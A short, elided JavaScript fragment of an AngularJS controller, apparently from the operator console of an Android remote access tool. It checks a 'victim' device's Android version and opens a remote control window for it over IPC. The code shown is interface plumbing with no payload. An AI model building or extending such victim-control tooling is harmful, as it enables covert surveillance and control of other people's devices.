...
app.controller("LabCtrl", function($scope, $rootScope, $location) {
    ...
    $labCtrl.openRemoteControl = () => {
        // Get victim device ID from socket
        const victimIndex = socket.handshake.query.id;
        
        // Check API level (if available)
        const release = socket.handshake.query.release;
        const apiLevel = parseInt(release);
        
        if (apiLevel && apiLevel < 21) {
            $rootScope.Log('Remote Control requires Android 5.0 (API 21) or higher. This device is running Android ' + release, CONSTANTS.logStatus.FAIL);
            return;
        }
        
        $rootScope.Log('Opening Remote Control window...');
        
        // Send IPC to main process to open remote control window
        ipcRenderer.send('openRemoteControlWindow', victimIndex);
    }
